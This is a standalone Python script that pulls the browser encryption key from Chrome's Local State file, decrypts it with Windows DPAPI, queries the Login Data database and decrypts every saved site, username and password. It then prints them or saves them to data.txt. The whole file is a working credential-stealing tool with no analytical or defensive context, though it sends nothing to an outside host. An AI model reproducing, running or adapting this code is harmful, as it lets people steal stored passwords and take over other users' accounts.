
import os,base64,sqlite3,win32crypt
from Crypto.Cipher import AES
import json

def get_key():

    local_state_file = os.path.join(os.environ["USERPROFILE"],"AppData","Local","Google","Chrome","User Data","Local State")
    with open(local_state_file,"r",encoding="utf-8") as f:
        data = f.read()
        data = json.loads(data)
    
    key = base64.b64decode(data["os_crypt"]["encrypted_key"])
    key = key[5:]

    final_key =  win32crypt.CryptUnprotectData(key,None,None,None,0)[1]
    return final_key

def decrypt_pass(encrypted_pass,key):
    try:
        cipher_key = encrypted_pass[3:15]
        passwd = encrypted_pass[15:]

        cipher = AES.new(key,AES.MODE_GCM,cipher_key)
        decrypted_pass = cipher.decrypt(passwd)[:-16].decode()
        return decrypted_pass
    except:
        try:
            return str(win32crypt.CryptUnprotectData(encrypted_pass,None,None,None,0)[1])
        except:
            return "[!]Password decryption failed"

def start():
    key = get_key()
    login_data = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
						"Google", "Chrome", "User Data", "default", "Login Data")
    
    print("[*]Passwords found")
    option = input("Do you want to save them in a file?Y/N(Default:N)")

    connection = sqlite3.connect(login_data)
    c = connection.cursor()
    c.execute("select origin_url,username_value,password_value from logins order by date_last_used")

    print("[*]Decrypting passwords...")
    
    for data in c.fetchall():
        url = data[0]
        user = data[1]
        passw = decrypt_pass(data[2],key)

        if user or passw:
            if option == "y" or option == "Y":
                with open("data.txt","a") as f:
                    f.write("[+]URL:"+url + "\n")
                    f.write("[+]Username:"+user + "\n")
                    f.write("[+]Password:"+str(passw) + "\n\n")
                    f.close()
            else:
                print("[+]URL:"+url)
                print("[+]Username:"+user)
                print("[+]Password:"+str(passw))
                print("")
        else:
            continue
    
    if option=="y" or option == "Y":
        print("[+]All data has been successfully saved to data.txt")
    c.close()
    connection.close()

print("[*]Looking for passwords...")
start()
